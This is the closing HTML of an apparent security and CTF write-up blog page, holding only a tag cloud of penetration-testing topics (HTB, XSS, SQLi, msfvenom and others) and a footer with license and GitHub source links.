            <li class="tag tag-4">
              <a href="../../tag/memcache.html">memcache</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/osint.html">osint</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/iot.html">IOT</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/blog.html">blog</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/ctf.html">CTF</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/winrm.html">winrm</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/vulnhub.html">vulnhub</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/teamviewer.html">teamviewer</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxd.html">lxd</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vb.html">VB</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/msfvenom.html">msfvenom</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/strapi.html">strapi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/subdomain.html">subdomain</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/zip.html">zip</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chisel.html">chisel</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/php-filter.html">php filter</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/security.html">security</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/vault.html">vault</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/logrotate.html">logrotate</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/gitlab.html">gitlab</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/bludit.html">bludit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xxe.html">XXE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xss.html">XSS</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/capabilities.html">capabilities</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cloudme.html">cloudme</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/imagemagick.html">ImageMagick</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/print-nightmare.html">print nightmare</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/linux.html">linux</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/php.html">php</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/laravel.html">laravel</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/suid.html">suid</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/htb.html">HTB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/splunk.html">Splunk</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/jwt.html">jwt</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/gdbserver.html">gdbserver</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/exiftool.html">exiftool</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/wordpress.html">wordpress</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/exploit.html">exploit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxc.html">lxc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/path.html">PATH</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/cve.html">CVE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/enumeration.html">enumeration</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openemr.html">openEMR</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/core-dump.html">core dump</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sqli.html">SQLi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssti.html">SSTI</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openbsd.html">OpenBSD</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adminer.html">adminer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pandora.html">pandora</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/yaml.html">YAML</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phishing.html">phishing</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/tomcat.html">tomcat</a>
            </li>
    </ul>
</section>

            </div>
        </aside>
    </div>

    <section class="pure-g-r footer">
<div class="pure-u-2-3 copyright">
    <p class="l-box">
        The content of this blog in under
        <a href="https://creativecommons.org/licenses/by/4.0/"
            title="Share, adapt, use. But mention the author.">Creative Commons Attribution 4.0</a> License.

        The source code is available on <a href="https://github.com/maggick/maggick.github.io/" title="Contribute through GitHub">GitHub</a>.
    </p>
</div>

<div class="pure-u-1-3 credits">
    <p class="l-box">
        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
    </p>
</div>    </section>


</div>
</body>
</html>